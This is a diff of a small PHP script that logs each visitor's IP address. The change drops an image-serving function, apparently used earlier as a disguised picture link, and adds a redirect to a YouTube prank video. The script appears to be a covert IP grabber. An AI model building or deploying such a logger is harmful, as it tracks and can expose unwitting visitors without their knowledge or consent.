@@ -1,12 +1,5 @@
 <?php
-
-function print_img(){
-    $img = file_get_contents('asd.jpeg');
-
-    header("Content-Type: image/jpeg");
-    
-    echo $img;
-}
+$url_redirect = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
 
 function get_client_ip() {
     $ipaddress = '';
@@ -45,5 +38,5 @@ function write_ip(){
 }
 
 write_ip();
-print_img();
+header("Location: $url_redirect");
 ?>
